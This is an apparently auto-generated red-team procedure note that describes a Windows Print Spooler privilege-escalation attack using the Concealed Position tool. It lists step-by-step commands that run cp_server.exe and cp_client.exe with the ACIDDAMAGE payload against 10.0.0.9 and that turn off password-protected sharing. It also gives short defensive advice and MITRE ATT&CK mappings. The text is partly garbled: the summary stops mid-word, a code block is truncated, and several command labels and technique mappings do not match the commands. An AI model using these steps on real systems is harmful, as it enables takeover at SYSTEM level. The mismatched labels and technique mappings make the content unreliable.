---
id: 401ed390-f508-4903-ace8-f53d02192fe7
name: Printer Spooler Service Elevation of Privilege
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.918021+00:00'
updated_at: '2023-04-10T20:37:31.482382+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
- '[[Event Triggered Execution|T1546 - Event Triggered Execution]]'
sub_techniques:
- '[[Accessibility Features|T1546.008 - Accessibility Features]]'
tags:
- '[[Bring Your Own Vulnerability]]'
- '[[EoP - Printers]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Copy client executable with specified parameters]]'
- '[[Copy server executable with specified parameters]]'
- '[[Get printer information]]'
- '[[List shared printers]]'
- '[[Turn off password protected sharing]]'
---

# Printer Spooler Service Elevation of Privilege

## Summary

This technique abuses the Windows Print Spooler service to elevate privileges. An attacker can exploit a vulnerability in the Print Spooler service to execute code in the context of the SYSTEM account. The attacker can then use this access to take control of the affected system. This technique requ

## Description

# Description

This technique abuses the Windows Print Spooler service to elevate privileges. An attacker can exploit a vulnerability in the Print Spooler service to execute code in the context of the SYSTEM account. The attacker can then use this access to take control of the affected system. This technique requires the attacker to have access to the system and the ability to execute code. This technique can be used to escalate privileges on a compromised system or to gain initial access to a system.

Business Value: This technique can be used by attackers to gain access to sensitive data, steal credentials or perform other malicious activities on a system. By gaining access to the SYSTEM account, the attacker can take full control of the affected system and use it as a beachhead to launch further attacks.

 

## Requirements

1. Access to the target system

1. Ability to execute code on the target system

 

## Defense

1. Disable the Print Spooler service if it is not needed

1. Apply the latest security updates to the operating system and applications

1. Implement least privilege access control to limit the impact of a potential attack

 

## Objectives

1. Gain elevated privileges on the target system

1. Compromise the target system

 

# Instructions

1. To copy the Concealed Position server and client, follow these steps:
1. Run the command 'cp_server.exe -e ACIDDAMAGE' to create the server
2. Get the printer
3. Set the "Advanced Sharing Settings" to "Turn off password protected sharing"
4. Run the command 'cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE' to create the client
5. Run the command 'cp_client.exe -l -e ACIDDAMAGE' to launch the client

 



**Code**: [[cp_server.exe -e ACIDDAMAGE
# Get-Printer
# Set th]]



> The 'cp_server.exe' command is used to create a Concealed Position server with the name 'ACIDDAMAGE'. The 'Get-Printer' command is used to retrieve the printer. The 'Advanced Sharing Settings' should be turned off to allow the client to connect to the server. The 'cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE' command is used to create a client with the name 'ACIDDAMAGE' and connect it to the server at IP address '10.0.0.9'. The 'cp_client.exe -l -e ACIDDAMAGE' command is used to launch the client.



**Command** ([[Copy server executable with specified parameters]]):

```bash
cp_server.exe -e ACIDDAMAGE
```





**Command** ([[Get printer information]]):

```bash
# Get-Printer
```





**Command** ([[Turn off password protected sharing]]):

```bash
# Set the "Advanced Sharing Settings" -> "Turn off password protected sharing"
```





**Command** ([[Copy client executable with specified parameters]]):

```bash
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
```





**Command** ([[List shared printers]]):

```bash
cp_client.exe -l -e ACIDDAMAGE
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]
- [[Event Triggered Execution|T1546 - Event Triggered Execution]]

### Sub-Techniques

- [[Accessibility Features|T1546.008 - Accessibility Features]]

## Commands Used

- [[Copy client executable with specified parameters]]
- [[Copy server executable with specified parameters]]
- [[Get printer information]]
- [[List shared printers]]
- [[Turn off password protected sharing]]

## Tags

- [[Bring Your Own Vulnerability]]
- [[EoP - Printers]]
- [[Windows - Privilege Escalation]]


